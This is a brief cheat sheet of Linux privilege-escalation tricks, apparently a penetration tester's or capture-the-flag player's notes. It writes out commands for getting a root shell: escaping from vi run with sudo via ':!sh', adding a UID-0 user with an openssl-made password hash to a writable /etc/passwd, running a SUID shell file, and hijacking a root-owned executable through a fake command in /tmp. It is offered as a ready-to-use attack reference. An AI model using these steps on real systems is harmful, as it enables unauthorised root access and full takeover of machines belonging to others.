1. if you can run vi as a root,
sudo vi
:!sh

2. if you can edit the /etc/passwd file,
add a user to the file 
create a pass hash:
openssl passwd -1 -salt [salt] [password]
[user]:[passhash]:0:0:root:/root:/bin/bash

3. shell is an SUID bit file,
running it will give us root shell
(shell is a previously made file)

4. if you can edit a root owned executable,
see what is does 
imitate it in tmp by putting /bin/bash into the command we're immitating
go back to the directory of the executable and run it
